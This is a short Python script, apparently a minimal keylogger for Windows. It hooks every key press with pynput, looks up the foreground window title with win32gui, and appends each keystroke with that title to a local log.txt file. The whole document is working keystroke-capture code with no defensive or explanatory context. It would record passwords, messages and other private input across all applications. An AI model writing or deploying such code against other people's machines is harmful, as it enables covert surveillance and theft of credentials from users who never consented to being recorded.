from pynput.keyboard import Key, Listener
import win32gui

def on_press(key):
    hwnd = win32gui.GetForegroundWindow()
    win_title = win32gui.GetWindowText(hwnd)


    key = str(key)
    with open("log.txt", "a") as f:
        print(key)
        f.write(key + ' ' + win_title + "\n")

with Listener(on_press=on_press) as listener:
    listener.join()
